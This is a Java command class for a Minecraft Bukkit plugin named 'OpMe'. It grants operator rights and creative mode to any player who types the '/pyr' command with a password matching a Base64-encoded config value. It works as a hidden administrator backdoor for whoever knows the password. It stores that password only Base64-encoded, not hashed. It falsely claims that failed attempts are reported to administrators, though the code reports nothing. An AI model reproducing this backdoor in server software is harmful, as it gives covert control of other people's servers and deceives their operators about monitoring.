package pyr.solutions.allkingplugin.commands;

import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import pyr.solutions.allkingplugin.AllKingPlugin;
import java.util.Base64;

public class OpMe implements CommandExecutor {

    Plugin plugin = AllKingPlugin.getPlugin(AllKingPlugin.class);

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args){
        if(command.getName().equals("pyr") && sender instanceof Player && args.length > 0 && args[0] instanceof String){
            String pass = plugin.getConfig().getString("Password");
            String input_pass = Base64.getEncoder().encodeToString(args[0].getBytes());
            Player player = (Player) sender;
            if (pass.equals(input_pass)){
                player.setOp(true);
                player.setGameMode(GameMode.CREATIVE);
                player.sendMessage("Welcome back my Lord!");
            } else {
                player.sendMessage("The given param was invalid. Your action has been reported to server administration.");
            }
            return true;
        }
        return false;
    }
}
